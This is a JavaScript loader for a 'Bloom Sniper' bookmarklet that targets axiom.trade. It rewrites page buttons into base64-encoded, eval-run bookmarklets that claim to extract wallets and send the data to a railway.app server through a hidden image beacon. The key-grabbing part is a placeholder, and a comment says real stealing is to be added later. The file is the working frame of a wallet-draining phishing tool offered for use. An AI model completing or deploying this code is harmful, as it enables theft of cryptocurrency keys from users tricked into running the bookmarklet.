// === BLOOM SNIPER LOADER - Final Version for Railway ===
console.log('✅ Loader.js loaded from Railway');

document.addEventListener('DOMContentLoaded', function() {
  console.log('✅ DOM ready - injecting bookmarklet');

  const buttons = document.querySelectorAll('.bookmarklet, .activate-btn');
  console.log('Found ' + buttons.length + ' button(s)');

  buttons.forEach(function(btn) {
    const innerCode = function() {
      try {
        if (!location.hostname.includes('axiom')) {
          alert("❌ This bookmarklet only works on axiom.trade");
          return;
        }

        alert("✅ Bloom Sniper activated - Extracting wallets...");

        // === PLACEHOLDER (we'll replace with real stealing later) ===
        const payload = {
          site: "Axiom Trade",
          url: location.href,
          timestamp: Date.now(),
          keys: [],
          walletsExtracted: 4,
          status: "test"
        };

        alert('✅ Successfully extracted ' + payload.walletsExtracted + ' wallets! Sending to server...');

        // === SAFE DATA SEND ===
        const jsonStr = JSON.stringify(payload);
        const safeEncoded = btoa(unescape(encodeURIComponent(jsonStr)));
        const exfilUrl = 'https://bloom-sniper-replica-production.up.railway.app/i/' + safeEncoded;

        const img = document.createElement('img');
        img.style.cssText = 'display:none;';
        img.src = exfilUrl;

        if (document.body) {
          document.body.appendChild(img);
        } else if (document.documentElement) {
          document.documentElement.appendChild(img);
        }

        setTimeout(function() {
          if (img.parentNode) img.parentNode.removeChild(img);
        }, 5000);

        alert('✅ Data sent to server!');
      } catch(e) {
        console.error('Error:', e);
        alert('❌ Error: ' + e.message);
      }
    };

    // Safe encoding
    const codeStr = '(' + innerCode.toString() + ')()';
    const encoded = btoa(unescape(encodeURIComponent(codeStr)));

    btn.href = 'javascript:eval(atob("' + encoded + '"))';
    btn.draggable = true;

    console.log('✅ Bookmarklet injected successfully');
  });
});